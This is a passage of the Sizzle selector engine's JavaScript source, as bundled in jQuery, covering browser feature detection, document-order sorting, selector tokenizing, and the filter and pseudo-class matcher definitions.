        input.setAttribute( "type", "hidden" );
        el.appendChild( input ).setAttribute( "name", "D" );

        // Support: IE8
        // Enforce case-sensitivity of name attribute
        if ( el.querySelectorAll( "[name=d]" ).length ) {
            rbuggyQSA.push( "name" + whitespace + "*[*^$|!~]?=" );
        }

        // FF 3.5 - :enabled/:disabled and hidden elements (hidden elements are still enabled)
        // IE8 throws error here and will not see later tests
        if ( el.querySelectorAll( ":enabled" ).length !== 2 ) {
            rbuggyQSA.push( ":enabled", ":disabled" );
        }

        // Support: IE9-11+
        // IE's :disabled selector does not pick up the children of disabled fieldsets
        docElem.appendChild( el ).disabled = true;
        if ( el.querySelectorAll( ":disabled" ).length !== 2 ) {
            rbuggyQSA.push( ":enabled", ":disabled" );
        }

        // Support: Opera 10 - 11 only
        // Opera 10-11 does not throw on post-comma invalid pseudos
        el.querySelectorAll( "*,:x" );
        rbuggyQSA.push( ",.*:" );
    } );
}

if ( ( support.matchesSelector = rnative.test( ( matches = docElem.matches ||
    docElem.webkitMatchesSelector ||
    docElem.mozMatchesSelector ||
    docElem.oMatchesSelector ||
    docElem.msMatchesSelector ) ) ) ) {

    assert( function( el ) {

        // Check to see if it's possible to do matchesSelector
        // on a disconnected node (IE 9)
        support.disconnectedMatch = matches.call( el, "*" );

        // This should fail with an exception
        // Gecko does not error, returns false instead
        matches.call( el, "[s!='']:x" );
        rbuggyMatches.push( "!=", pseudos );
    } );
}

rbuggyQSA = rbuggyQSA.length && new RegExp( rbuggyQSA.join( "|" ) );
rbuggyMatches = rbuggyMatches.length && new RegExp( rbuggyMatches.join( "|" ) );

/* Contains
---------------------------------------------------------------------- */
hasCompare = rnative.test( docElem.compareDocumentPosition );

// Element contains another
// Purposefully self-exclusive
// As in, an element does not contain itself
contains = hasCompare || rnative.test( docElem.contains ) ?
    function( a, b ) {
        var adown = a.nodeType === 9 ? a.documentElement : a,
            bup = b && b.parentNode;
        return a === bup || !!( bup && bup.nodeType === 1 && (
            adown.contains ?
                adown.contains( bup ) :
                a.compareDocumentPosition && a.compareDocumentPosition( bup ) & 16
        ) );
    } :
    function( a, b ) {
        if ( b ) {
            while ( ( b = b.parentNode ) ) {
                if ( b === a ) {
                    return true;
                }
            }
        }
        return false;
    };

/* Sorting
---------------------------------------------------------------------- */

// Document order sorting
sortOrder = hasCompare ?
function( a, b ) {

    // Flag for duplicate removal
    if ( a === b ) {
        hasDuplicate = true;
        return 0;
    }

    // Sort on method existence if only one input has compareDocumentPosition
    var compare = !a.compareDocumentPosition - !b.compareDocumentPosition;
    if ( compare ) {
        return compare;
    }

    // Calculate position if both inputs belong to the same document
    // Support: IE 11+, Edge 17 - 18+
    // IE/Edge sometimes throw a "Permission denied" error when strict-comparing
    // two documents; shallow comparisons work.
    // eslint-disable-next-line eqeqeq
    compare = ( a.ownerDocument || a ) == ( b.ownerDocument || b ) ?
        a.compareDocumentPosition( b ) :

        // Otherwise we know they are disconnected
        1;

    // Disconnected nodes
    if ( compare & 1 ||
        ( !support.sortDetached && b.compareDocumentPosition( a ) === compare ) ) {

        // Choose the first element that is related to our preferred document
        // Support: IE 11+, Edge 17 - 18+
        // IE/Edge sometimes throw a "Permission denied" error when strict-comparing
        // two documents; shallow comparisons work.
        // eslint-disable-next-line eqeqeq
        if ( a == document || a.ownerDocument == preferredDoc &&
            contains( preferredDoc, a ) ) {
            return -1;
        }

        // Support: IE 11+, Edge 17 - 18+
        // IE/Edge sometimes throw a "Permission denied" error when strict-comparing
        // two documents; shallow comparisons work.
        // eslint-disable-next-line eqeqeq
        if ( b == document || b.ownerDocument == preferredDoc &&
            contains( preferredDoc, b ) ) {
            return 1;
        }

        // Maintain original order
        return sortInput ?
            ( indexOf( sortInput, a ) - indexOf( sortInput, b ) ) :
            0;
    }

    return compare & 4 ? -1 : 1;
} :
function( a, b ) {

    // Exit early if the nodes are identical
    if ( a === b ) {
        hasDuplicate = true;
        return 0;
    }

    var cur,
        i = 0,
        aup = a.parentNode,
        bup = b.parentNode,
        ap = [ a ],
        bp = [ b ];

    // Parentless nodes are either documents or disconnected
    if ( !aup || !bup ) {

        // Support: IE 11+, Edge 17 - 18+
        // IE/Edge sometimes throw a "Permission denied" error when strict-comparing
        // two documents; shallow comparisons work.
        /* eslint-disable eqeqeq */
        return a == document ? -1 :
            b == document ? 1 :
            /* eslint-enable eqeqeq */
            aup ? -1 :
            bup ? 1 :
            sortInput ?
            ( indexOf( sortInput, a ) - indexOf( sortInput, b ) ) :
            0;

    // If the nodes are siblings, we can do a quick check
    } else if ( aup === bup ) {
        return siblingCheck( a, b );
    }

    // Otherwise we need full lists of their ancestors for comparison
    cur = a;
    while ( ( cur = cur.parentNode ) ) {
        ap.unshift( cur );
    }
    cur = b;
    while ( ( cur = cur.parentNode ) ) {
        bp.unshift( cur );
    }

    // Walk down the tree looking for a discrepancy
    while ( ap[ i ] === bp[ i ] ) {
        i++;
    }

    return i ?

        // Do a sibling check if the nodes have a common ancestor
        siblingCheck( ap[ i ], bp[ i ] ) :

        // Otherwise nodes in our document sort first
        // Support: IE 11+, Edge 17 - 18+
        // IE/Edge sometimes throw a "Permission denied" error when strict-comparing
        // two documents; shallow comparisons work.
        /* eslint-disable eqeqeq */
        ap[ i ] == preferredDoc ? -1 :
        bp[ i ] == preferredDoc ? 1 :
        /* eslint-enable eqeqeq */
        0;
};

return document;
};

Sizzle.matches = function( expr, elements ) {
return Sizzle( expr, null, null, elements );
};

Sizzle.matchesSelector = function( elem, expr ) {
setDocument( elem );

if ( support.matchesSelector && documentIsHTML &&
    !nonnativeSelectorCache[ expr + " " ] &&
    ( !rbuggyMatches || !rbuggyMatches.test( expr ) ) &&
    ( !rbuggyQSA     || !rbuggyQSA.test( expr ) ) ) {

    try {
        var ret = matches.call( elem, expr );

        // IE 9's matchesSelector returns false on disconnected nodes
        if ( ret || support.disconnectedMatch ||

            // As well, disconnected nodes are said to be in a document
            // fragment in IE 9
            elem.document && elem.document.nodeType !== 11 ) {
            return ret;
        }
    } catch ( e ) {
        nonnativeSelectorCache( expr, true );
    }
}

return Sizzle( expr, document, null, [ elem ] ).length > 0;
};

Sizzle.contains = function( context, elem ) {

// Set document vars if needed
// Support: IE 11+, Edge 17 - 18+
// IE/Edge sometimes throw a "Permission denied" error when strict-comparing
// two documents; shallow comparisons work.
// eslint-disable-next-line eqeqeq
if ( ( context.ownerDocument || context ) != document ) {
    setDocument( context );
}
return contains( context, elem );
};

Sizzle.attr = function( elem, name ) {

// Set document vars if needed
// Support: IE 11+, Edge 17 - 18+
// IE/Edge sometimes throw a "Permission denied" error when strict-comparing
// two documents; shallow comparisons work.
// eslint-disable-next-line eqeqeq
if ( ( elem.ownerDocument || elem ) != document ) {
    setDocument( elem );
}

var fn = Expr.attrHandle[ name.toLowerCase() ],

    // Don't get fooled by Object.prototype properties (jQuery #13807)
    val = fn && hasOwn.call( Expr.attrHandle, name.toLowerCase() ) ?
        fn( elem, name, !documentIsHTML ) :
        undefined;

return val !== undefined ?
    val :
    support.attributes || !documentIsHTML ?
        elem.getAttribute( name ) :
        ( val = elem.getAttributeNode( name ) ) && val.specified ?
            val.value :
            null;
};

Sizzle.escape = function( sel ) {
return ( sel + "" ).replace( rcssescape, fcssescape );
};

Sizzle.error = function( msg ) {
throw new Error( "Syntax error, unrecognized expression: " + msg );
};

/**
* Document sorting and removing duplicates
* @param {ArrayLike} results
*/
Sizzle.uniqueSort = function( results ) {
var elem,
    duplicates = [],
    j = 0,
    i = 0;

// Unless we *know* we can detect duplicates, assume their presence
hasDuplicate = !support.detectDuplicates;
sortInput = !support.sortStable && results.slice( 0 );
results.sort( sortOrder );

if ( hasDuplicate ) {
    while ( ( elem = results[ i++ ] ) ) {
        if ( elem === results[ i ] ) {
            j = duplicates.push( i );
        }
    }
    while ( j-- ) {
        results.splice( duplicates[ j ], 1 );
    }
}

// Clear input after sorting to release objects
// See https://github.com/jquery/sizzle/pull/225
sortInput = null;

return results;
};

/**
* Utility function for retrieving the text value of an array of DOM nodes
* @param {Array|Element} elem
*/
getText = Sizzle.getText = function( elem ) {
var node,
    ret = "",
    i = 0,
    nodeType = elem.nodeType;

if ( !nodeType ) {

    // If no nodeType, this is expected to be an array
    while ( ( node = elem[ i++ ] ) ) {

        // Do not traverse comment nodes
        ret += getText( node );
    }
} else if ( nodeType === 1 || nodeType === 9 || nodeType === 11 ) {

    // Use textContent for elements
    // innerText usage removed for consistency of new lines (jQuery #11153)
    if ( typeof elem.textContent === "string" ) {
        return elem.textContent;
    } else {

        // Traverse its children
        for ( elem = elem.firstChild; elem; elem = elem.nextSibling ) {
            ret += getText( elem );
        }
    }
} else if ( nodeType === 3 || nodeType === 4 ) {
    return elem.nodeValue;
}

// Do not include comment or processing instruction nodes

return ret;
};

Expr = Sizzle.selectors = {

// Can be adjusted by the user
cacheLength: 50,

createPseudo: markFunction,

match: matchExpr,

attrHandle: {},

find: {},

relative: {
    ">": { dir: "parentNode", first: true },
    " ": { dir: "parentNode" },
    "+": { dir: "previousSibling", first: true },
    "~": { dir: "previousSibling" }
},

preFilter: {
    "ATTR": function( match ) {
        match[ 1 ] = match[ 1 ].replace( runescape, funescape );

        // Move the given value to match[3] whether quoted or unquoted
        match[ 3 ] = ( match[ 3 ] || match[ 4 ] ||
            match[ 5 ] || "" ).replace( runescape, funescape );

        if ( match[ 2 ] === "~=" ) {
            match[ 3 ] = " " + match[ 3 ] + " ";
        }

        return match.slice( 0, 4 );
    },

    "CHILD": function( match ) {

        /* matches from matchExpr["CHILD"]
            1 type (only|nth|...)
            2 what (child|of-type)
            3 argument (even|odd|\d*|\d*n([+-]\d+)?|...)
            4 xn-component of xn+y argument ([+-]?\d*n|)
            5 sign of xn-component
            6 x of xn-component
            7 sign of y-component
            8 y of y-component
        */
        match[ 1 ] = match[ 1 ].toLowerCase();

        if ( match[ 1 ].slice( 0, 3 ) === "nth" ) {

            // nth-* requires argument
            if ( !match[ 3 ] ) {
                Sizzle.error( match[ 0 ] );
            }

            // numeric x and y parameters for Expr.filter.CHILD
            // remember that false/true cast respectively to 0/1
            match[ 4 ] = +( match[ 4 ] ?
                match[ 5 ] + ( match[ 6 ] || 1 ) :
                2 * ( match[ 3 ] === "even" || match[ 3 ] === "odd" ) );
            match[ 5 ] = +( ( match[ 7 ] + match[ 8 ] ) || match[ 3 ] === "odd" );

            // other types prohibit arguments
        } else if ( match[ 3 ] ) {
            Sizzle.error( match[ 0 ] );
        }

        return match;
    },

    "PSEUDO": function( match ) {
        var excess,
            unquoted = !match[ 6 ] && match[ 2 ];

        if ( matchExpr[ "CHILD" ].test( match[ 0 ] ) ) {
            return null;
        }

        // Accept quoted arguments as-is
        if ( match[ 3 ] ) {
            match[ 2 ] = match[ 4 ] || match[ 5 ] || "";

        // Strip excess characters from unquoted arguments
        } else if ( unquoted && rpseudo.test( unquoted ) &&

            // Get excess from tokenize (recursively)
            ( excess = tokenize( unquoted, true ) ) &&

            // advance to the next closing parenthesis
            ( excess = unquoted.indexOf( ")", unquoted.length - excess ) - unquoted.length ) ) {

            // excess is a negative index
            match[ 0 ] = match[ 0 ].slice( 0, excess );
            match[ 2 ] = unquoted.slice( 0, excess );
        }

        // Return only captures needed by the pseudo filter method (type and argument)
        return match.slice( 0, 3 );
    }
},

filter: {

    "TAG": function( nodeNameSelector ) {
        var nodeName = nodeNameSelector.replace( runescape, funescape ).toLowerCase();
        return nodeNameSelector === "*" ?
            function() {
                return true;
            } :
            function( elem ) {
                return elem.nodeName && elem.nodeName.toLowerCase() === nodeName;
            };
    },

    "CLASS": function( className ) {
        var pattern = classCache[ className + " " ];

        return pattern ||
            ( pattern = new RegExp( "(^|" + whitespace +
                ")" + className + "(" + whitespace + "|$)" ) ) && classCache(
                    className, function( elem ) {
                        return pattern.test(
                            typeof elem.className === "string" && elem.className ||
                            typeof elem.getAttribute !== "undefined" &&
                                elem.getAttribute( "class" ) ||
                            ""
                        );
            } );
    },

    "ATTR": function( name, operator, check ) {
        return function( elem ) {
            var result = Sizzle.attr( elem, name );

            if ( result == null ) {
                return operator === "!=";
            }
            if ( !operator ) {
                return true;
            }

            result += "";

            /* eslint-disable max-len */

            return operator === "=" ? result === check :
                operator === "!=" ? result !== check :
                operator === "^=" ? check && result.indexOf( check ) === 0 :
                operator === "*=" ? check && result.indexOf( check ) > -1 :
                operator === "$=" ? check && result.slice( -check.length ) === check :
                operator === "~=" ? ( " " + result.replace( rwhitespace, " " ) + " " ).indexOf( check ) > -1 :
                operator === "|=" ? result === check || result.slice( 0, check.length + 1 ) === check + "-" :
                false;
            /* eslint-enable max-len */

        };
    },

    "CHILD": function( type, what, _argument, first, last ) {
        var simple = type.slice( 0, 3 ) !== "nth",
            forward = type.slice( -4 ) !== "last",
            ofType = what === "of-type";

        return first === 1 && last === 0 ?

            // Shortcut for :nth-*(n)
            function( elem ) {
                return !!elem.parentNode;
            } :

            function( elem, _context, xml ) {
                var cache, uniqueCache, outerCache, node, nodeIndex, start,
                    dir = simple !== forward ? "nextSibling" : "previousSibling",
                    parent = elem.parentNode,
                    name = ofType && elem.nodeName.toLowerCase(),
                    useCache = !xml && !ofType,
                    diff = false;

                if ( parent ) {

                    // :(first|last|only)-(child|of-type)
                    if ( simple ) {
                        while ( dir ) {
                            node = elem;
                            while ( ( node = node[ dir ] ) ) {
                                if ( ofType ?
                                    node.nodeName.toLowerCase() === name :
                                    node.nodeType === 1 ) {

                                    return false;
                                }
                            }

                            // Reverse direction for :only-* (if we haven't yet done so)
                            start = dir = type === "only" && !start && "nextSibling";
                        }
                        return true;
                    }

                    start = [ forward ? parent.firstChild : parent.lastChild ];

                    // non-xml :nth-child(...) stores cache data on `parent`
                    if ( forward && useCache ) {

                        // Seek `elem` from a previously-cached index

                        // ...in a gzip-friendly way
                        node = parent;
                        outerCache = node[ expando ] || ( node[ expando ] = {} );

                        // Support: IE <9 only
                        // Defend against cloned attroperties (jQuery gh-1709)
                        uniqueCache = outerCache[ node.uniqueID ] ||
                            ( outerCache[ node.uniqueID ] = {} );

                        cache = uniqueCache[ type ] || [];
                        nodeIndex = cache[ 0 ] === dirruns && cache[ 1 ];
                        diff = nodeIndex && cache[ 2 ];
                        node = nodeIndex && parent.childNodes[ nodeIndex ];

                        while ( ( node = ++nodeIndex && node && node[ dir ] ||

                            // Fallback to seeking `elem` from the start
                            ( diff = nodeIndex = 0 ) || start.pop() ) ) {

                            // When found, cache indexes on `parent` and break
                            if ( node.nodeType === 1 && ++diff && node === elem ) {
                                uniqueCache[ type ] = [ dirruns, nodeIndex, diff ];
                                break;
                            }
                        }

                    } else {

                        // Use previously-cached element index if available
                        if ( useCache ) {

                            // ...in a gzip-friendly way
                            node = elem;
                            outerCache = node[ expando ] || ( node[ expando ] = {} );

                            // Support: IE <9 only
                            // Defend against cloned attroperties (jQuery gh-1709)
                            uniqueCache = outerCache[ node.uniqueID ] ||
                                ( outerCache[ node.uniqueID ] = {} );

                            cache = uniqueCache[ type ] || [];
                            nodeIndex = cache[ 0 ] === dirruns && cache[ 1 ];
                            diff = nodeIndex;
                        }

                        // xml :nth-child(...)
                        // or :nth-last-child(...) or :nth(-last)?-of-type(...)
                        if ( diff === false ) {

                            // Use the same loop as above to seek `elem` from the start
                            while ( ( node = ++nodeIndex && node && node[ dir ] ||
                                ( diff = nodeIndex = 0 ) || start.pop() ) ) {

                                if ( ( ofType ?
                                    node.nodeName.toLowerCase() === name :
                                    node.nodeType === 1 ) &&
                                    ++diff ) {

                                    // Cache the index of each encountered element
                                    if ( useCache ) {
                                        outerCache = node[ expando ] ||
                                            ( node[ expando ] = {} );

                                        // Support: IE <9 only
                                        // Defend against cloned attroperties (jQuery gh-1709)
                                        uniqueCache = outerCache[ node.uniqueID ] ||
                                            ( outerCache[ node.uniqueID ] = {} );

                                        uniqueCache[ type ] = [ dirruns, diff ];
                                    }

                                    if ( node === elem ) {
                                        break;
                                    }
                                }
                            }
                        }
                    }

                    // Incorporate the offset, then check against cycle size
                    diff -= last;
                    return diff === first || ( diff % first === 0 && diff / first >= 0 );
                }
            };
    },

    "PSEUDO": function( pseudo, argument ) {

        // pseudo-class names are case-insensitive
        // http://www.w3.org/TR/selectors/#pseudo-classes
        // Prioritize by case sensitivity in case custom pseudos are added with uppercase letters
        // Remember that setFilters inherits from pseudos
        var args,
            fn = Expr.pseudos[ pseudo ] || Expr.setFilters[ pseudo.toLowerCase() ] ||
                Sizzle.error( "unsupported pseudo: " + pseudo );

        // The user may use createPseudo to indicate that
        // arguments are needed to create the filter function
        // just as Sizzle does
        if ( fn[ expando ] ) {
            return fn( argument );
        }

        // But maintain support for old signatures
        if ( fn.length > 1 ) {
            args = [ pseudo, pseudo, "", argument ];
            return Expr.setFilters.hasOwnProperty( pseudo.toLowerCase() ) ?
                markFunction( function( seed, matches ) {
                    var idx,
                        matched = fn( seed, argument ),
                        i = matched.length;
                    while ( i-- ) {
                        idx = indexOf( seed, matched[ i ] );
                        seed[ idx ] = !( matches[ idx ] = matched[ i ] );
                    }
                } ) :
                function( elem ) {
                    return fn( elem, 0, args );
                };
        }

        return fn;
    }
},

pseudos: {

    // Potentially complex pseudos
    "not": markFunction( function( selector ) {

        // Trim the selector passed to compile
        // to avoid treating leading and trailing
        // spaces as combinators
        var input = [],
            results = [],
            matcher = compile( selector.replace( rtrim, "$1" ) );

        return matcher[ expando ] ?
            markFunction( function( seed, matches, _context, xml ) {
                var elem,
                    unmatched = matcher( seed, null, xml, [] ),
                    i = seed.length;

                // Match elements unmatched by `matcher`
                while ( i-- ) {
                    if ( ( elem = unmatched[ i ] ) ) {
                        seed[ i ] = !( matches[ i ] = elem );
                    }
                }
            } ) :
            function( elem, _context, xml ) {
                input[ 0 ] = elem;
                matcher( input, null, xml, results );

                // Don't keep the element (issue #299)
                input[ 0 ] = null;
                return !results.pop();
            };
    } ),

    "has": markFunction( function( selector ) {
        return function( elem ) {
            return Sizzle( selector, elem ).length > 0;
        };
    } ),

    "contains": markFunction( function( text ) {
        text = text.replace( runescape, funescape );
        return function( elem ) {
            return ( elem.textContent || getText( elem ) ).indexOf( text ) > -1;
        };
    } ),

    // "Whether an element is represented by a :lang() selector
    // is based solely on the element's language value
    // being equal to the identifier C,
    // or beginning with the identifier C immediately followed by "-".
    // The matching of C against the element's language value is performed case-insensitively.
    // The identifier C does not have to be a valid language name."
    // http://www.w3.org/TR/selectors/#lang-pseudo
    "lang": markFunction( function( lang ) {

        // lang value must be a valid identifier
        if ( !ridentifier.test( lang || "" ) ) {
            Sizzle.error( "unsupported lang: " + lang );
        }
        lang = lang.replace( runescape, funescape ).toLowerCase();
        return function( elem ) {
            var elemLang;
            do {
                if ( ( elemLang = documentIsHTML ?
                    elem.lang :
                    elem.getAttribute( "xml:lang" ) || elem.getAttribute( "lang" ) ) ) {

                    elemLang = elemLang.toLowerCase();
                    return elemLang === lang || elemLang.indexOf( lang + "-" ) === 0;
                }
            } while ( ( elem = elem.parentNode ) && elem.nodeType === 1 );
            return false;
        };
    } ),

    // Miscellaneous
    "target": function( elem ) {
        var hash = window.location && window.location.hash;
        return hash && hash.slice( 1 ) === elem.id;
    },

    "root": function( elem ) {
        return elem === docElem;
    },

    "focus": function( elem ) {
        return elem === document.activeElement &&
            ( !document.hasFocus || document.hasFocus() ) &&
            !!( elem.type || elem.href || ~elem.tabIndex );
    },

    // Boolean properties
    "enabled": createDisabledPseudo( false ),
    "disabled": createDisabledPseudo( true ),

    "checked": function( elem ) {

        // In CSS3, :checked should return both checked and selected elements
        // http://www.w3.org/TR/2011/REC-css3-selectors-20110929/#checked
        var nodeName = elem.nodeName.toLowerCase();
        return ( nodeName === "input" && !!elem.checked ) ||
            ( nodeName === "option" && !!elem.selected );
    },

    "selected": function( elem ) {

        // Accessing this property makes selected-by-default
        // options in Safari work properly
        if ( elem.parentNode ) {
            // eslint-disable-next-line no-unused-expressions
            elem.parentNode.selectedIndex;
        }

        return elem.selected === true;
    },

    // Contents
    "empty": function( elem ) {

        // http://www.w3.org/TR/selectors/#empty-pseudo
        // :empty is negated by element (1) or content nodes (text: 3; cdata: 4; entity ref: 5),
        //   but not by others (comment: 8; processing instruction: 7; etc.)
        // nodeType < 6 works because attributes (2) do not appear as children
        for ( elem = elem.firstChild; elem; elem = elem.nextSibling ) {
            if ( elem.nodeType < 6 ) {
                return false;
            }
        }
        return true;
    },

    "parent": function( elem ) {
        return !Expr.pseudos[ "empty" ]( elem );
    },

    // Element/input types
    "header": function( elem ) {
        return rheader.test( elem.nodeName );
    },

    "input": function( elem ) {
        return rinputs.test( elem.nodeName );
    },

    "button": function( elem ) {
        var name = elem.nodeName.toLowerCase();
        return name === "input" && elem.type === "button" || name === "button";
    },

    "text": function( elem ) {
        var attr;
        return elem.nodeName.toLowerCase() === "input" &&
            elem.type === "text" &&

            // Support: IE<8
            // New HTML5 attribute values (e.g., "search") appear with elem.type === "text"
            ( ( attr = elem.getAttribute( "type" ) ) == null ||
                attr.toLowerCase() === "text" );
    },

    // Position-in-collection
    "first": createPositionalPseudo( function() {
        return [ 0 ];
    } ),

    "last": createPositionalPseudo( function( _matchIndexes, length ) {
        return [ length - 1 ];
    } ),

    "eq": createPositionalPseudo( function( _matchIndexes, length, argument ) {
        return [ argument < 0 ? argument + length : argument ];
    } ),

    "even": createPositionalPseudo( function( matchIndexes, length ) {
        var i = 0;
        for ( ; i < length; i += 2 ) {
            matchIndexes.push( i );
        }
        return matchIndexes;
    } ),

    "odd": createPositionalPseudo( function( matchIndexes, length ) {
        var i = 1;
        for ( ; i < length; i += 2 ) {
            matchIndexes.push( i );
        }
        return matchIndexes;
    } ),

    "lt": createPositionalPseudo( function( matchIndexes, length, argument ) {
        var i = argument < 0 ?
            argument + length :
            argument > length ?
                length :
                argument;
        for ( ; --i >= 0; ) {
            matchIndexes.push( i );
        }
        return matchIndexes;
    } ),

    "gt": createPositionalPseudo( function( matchIndexes, length, argument ) {
        var i = argument < 0 ? argument + length : argument;
        for ( ; ++i < length; ) {
            matchIndexes.push( i );
        }
        return matchIndexes;
    } )
}
};

Expr.pseudos[ "nth" ] = Expr.pseudos[ "eq" ];

// Add button/input type pseudos
for ( i in { radio: true, checkbox: true, file: true, password: true, image: true } ) {
Expr.pseudos[ i ] = createInputPseudo( i );
}
for ( i in { submit: true, reset: true } ) {
Expr.pseudos[ i ] = createButtonPseudo( i );
}

// Easy API for creating new setFilters
function setFilters() {}
setFilters.prototype = Expr.filters = Expr.pseudos;
Expr.setFilters = new setFilters();

tokenize = Sizzle.tokenize = function( selector, parseOnly ) {
var matched, match, tokens, type,
    soFar, groups, preFilters,
    cached = tokenCache[ selector + " " ];

if ( cached ) {
    return parseOnly ? 0 : cached.slice( 0 );
}

soFar = selector;
groups = [];
preFilters = Expr.preFilter;

while ( soFar ) {

    // Comma and first run
    if ( !matched || ( match = rcomma.exec( soFar ) ) ) {
        if ( match ) {

            // Don't consume trailing commas as valid
            soFar = soFar.slice( match[ 0 ].length ) || soFar;
        }
        groups.push( ( tokens = [] ) );
    }

    matched = false;

    // Combinators
    if ( ( match = rcombinators.exec( soFar ) ) ) {
        matched = match.shift();
        tokens.push( {
            value: matched,

            // Cast descendant combinators to space
            type: match[ 0 ].replace( rtrim, " " )
        } );
        soFar = soFar.slice( matched.length );
    }

    // Filters
    for ( type in Expr.filter ) {
        if ( ( match = matchExpr[ type ].exec( soFar ) ) && ( !preFilters[ type ] ||
            ( match = preFilters[ type ]( match ) ) ) ) {
            matched = match.shift();
            tokens.push( {
                value: matched,
                type: type,
                matches: match
            } );
            soFar = soFar.slice( matched.length );
        }
    }

    if ( !matched ) {
        break;
    }
}

// Return the length of the invalid excess
// if we're just parsing
// Otherwise, throw an error or return tokens
return parseOnly ?
    soFar.length :
    soFar ?
        Sizzle.error( selector ) :

        // Cache the tokens
        tokenCache( selector, groups ).slice( 0 );
};

function toSelector( tokens ) {
var i = 0,
    len = tokens.length,
    selector = "";
for ( ; i < len; i++ ) {
    selector += tokens[ i ].value;
}
return selector;
}

function addCombinator( matcher, combinator, base ) {
var dir = combinator.dir,
    skip = combinator.next,
    key = skip || dir,
    checkNonElements = base && key === "parentNode",
    doneName = done++;

return combinator.first ?

    // Check against closest ancestor/preceding element
    function( elem, context, xml ) {
        while ( ( elem = elem[ dir ] ) ) {
            if ( elem.nodeType === 1 || checkNonElements ) {
                return matcher( elem, context, xml );
            }
        }
        return false;
    } :

    // Check against all ancestor/preceding elements
    function( elem, context, xml ) {
        var oldCache, uniqueCache, outerCache,
            newCache = [ dirruns, doneName ];

        // We can't set arbitrary data on XML nodes, so they don't benefit from combinator caching
        if ( xml ) {
            while ( ( elem = elem[ dir ] ) ) {
                if ( elem.nodeType === 1 || checkNonElements ) {
                    if ( matcher( elem, context, xml ) ) {
                        return true;
                    }
                }
            }
        } else {
            while ( ( elem = elem[ dir ] ) ) {
                if ( elem.nodeType === 1 || checkNonElements ) {
                    outerCache = elem[ expando ] || ( elem[ expando ] = {} );

                    // Support: IE <9 only
                    // Defend against cloned attroperties (jQuery gh-1709)
                    uniqueCache = outerCache[ elem.uniqueID ] ||
                        ( outerCache[ elem.uniqueID ] = {} );

                    if ( skip && skip === elem.nodeName.toLowerCase() ) {
                        elem = elem[ dir ] || elem;
                    } else if ( ( oldCache = uniqueCache[ key ] ) &&
                        oldCache[ 0 ] === dirruns && oldCache[ 1 ] === doneName ) {

                        // Assign to newCache so results back-propagate to previous elements
                        return ( newCache[ 2 ] = oldCache[ 2 ] );
                    } else {

                        // Reuse newcache so results back-propagate to previous elements
                        uniqueCache[ key ] = newCache;

                        // A match means we're done; a fail means we have to keep checking
                        if ( ( newCache[ 2 ] = matcher( elem, context, xml ) ) ) {
                            return true;
                        }
                    }
                }
            }
        }
        return false;
    };
}

function elementMatcher( matchers ) {
return matchers.length > 1 ?
    function( elem, context, xml ) {
        var i = matchers.length;
        while ( i-- ) {
            if ( !matchers[ i ]( elem, context, xml ) ) {
                return false;
            }
        }
        return true;
    } :
    matchers[ 0 ];
}

function multipleContexts( selector, contexts, results ) {
var i = 0,
    len = contexts.length;
for ( ; i < len; i++ ) {
    Sizzle( selector, contexts[ i ], results );
}
return results;
}

function condense( unmatched, map, filter, context, xml ) {
var elem,
    newUnmatched = [],
    i = 0,
    len = unmatched.length,
    mapped = map != null;

for ( ; i < len; i++ ) {
    if ( ( elem = unmatched[ i ] ) ) {
        if ( !filter || filter( elem, context, xml ) ) {
            newUnmatched.push( elem );
            if ( mapped ) {
                map.push( i );
            }
        }
    }
}

return newUnmatched;
}

function setMatcher( preFilter, selector, matcher, postFilter, postFinder, postSelector ) {
if ( postFilter && !postFilter[ expando ] ) {
    postFilter = setMatcher( postFilter );
}
if ( postFinder && !postFinder[ expando ] ) {
    postFinder = setMatcher( postFinder, postSelector );
}
return markFunction( function( seed, results, context, xml ) {
    var temp, i, elem,
        preMap = [],
        postMap = [],
        preexisting = results.length,

        // Get initial elements from seed or context
        elems = seed || multipleContexts(
            selector || "*",
            context.nodeType ? [ context ] : context,
            []
        ),

        // Prefilter to get matcher input, preserving a map for seed-results synchronization
        matcherIn = preFilter && ( seed || !selector ) ?
            condense( elems, preMap, preFilter, context, xml ) :
            elems,

        matcherOut = matcher ?

            // If we have a postFinder, or filtered seed, or non-seed postFilter or preexisting results,
            postFinder || ( seed ? preFilter : preexisting || postFilter ) ?

                // ...intermediate processing is necessary
                [] :

                // ...otherwise use results directly
                results :
            matcherIn;

    // Find primary matches
    if ( matcher ) {
        matcher( matcherIn, matcherOut, context, xml );
    }

    // Apply postFilter
    if ( postFilter ) {
        temp = condense( matcherOut, postMap );
        postFilter( temp, [], context, xml );

        // Un-match failing elements by moving them back to matcherIn
        i = temp.length;
        while ( i-- ) {
            if ( ( elem = temp[ i ] ) ) {
                matcherOut[ postMap[ i ] ] = !( matcherIn[ postMap[ i ] ] = elem );
            }
        }
    }

    if ( seed ) {
        if ( postFinder || preFilter ) {
            if ( postFinder ) {

                // Get the final matcherOut by condensing this intermediate into postFinder contexts
                temp = [];
                i = matcherOut.length;
                while ( i-- ) {
                    if ( ( elem = matcherOut[ i ] ) ) {

                        // Restore matcherIn since elem is not yet a final match
                        temp.push( ( matcherIn[ i ] = elem ) );
                    }
                }
                postFinder( null, ( matcherOut = [] ), temp, xml );
            }

            // Move matched elements from seed to results to keep them synchronized
            i = matcherOut.length;
            while ( i-- ) {
                if ( ( elem = matcherOut[ i ] ) &&
                    ( temp = postFinder ? indexOf( seed, elem ) : preMap[ i ] ) > -1 ) {

                    seed[ temp ] = !( results[ temp ] = elem );
                }
            }
        }

    // Add elements to results, through postFinder if defined
    } else {
        matcherOut = condense(
            matcherOut === results ?
                matcherOut.splice( preexisting, matcherOut.length ) :
                matcherOut
        );
        if ( postFinder ) {
            postFinder( null, results, matcherOut, xml );
        } else {
            push.apply( results, matcherOut );
        }
    }
} );
}

function matcherFromTokens( tokens ) {
var checkContext, matcher, j,
    len = tokens.length,
    leadingRelative = Expr.relative[ tokens[ 0 ].type ],
    implicitRelative = leadingRelative || Expr.relative[ " " ],
    i = leadingRelative ? 1 : 0,

    // The foundational matcher ensures that elements are reachable from top-level context(s)
    matchContext = addCombinator( function( elem ) {
        return elem === checkContext;
    }, implicitRelative, true ),
    matchAnyContext = addCombinator( function( elem ) {
        return indexOf( checkContext, elem ) > -1;
    }, implicitRelative, true ),
    matchers = [ function( elem, context, xml ) {
        var ret = ( !leadingRelative && ( xml || context !== outermostContext ) ) || (
            ( checkContext = context ).nodeType ?
                matchContext( elem, context, xml ) :
                matchAnyContext( elem, context, xml ) );

        // Avoid hanging onto element (issue #299)
        checkContext = null;
        return ret;
    } ];

for ( ; i < len; i++ ) {
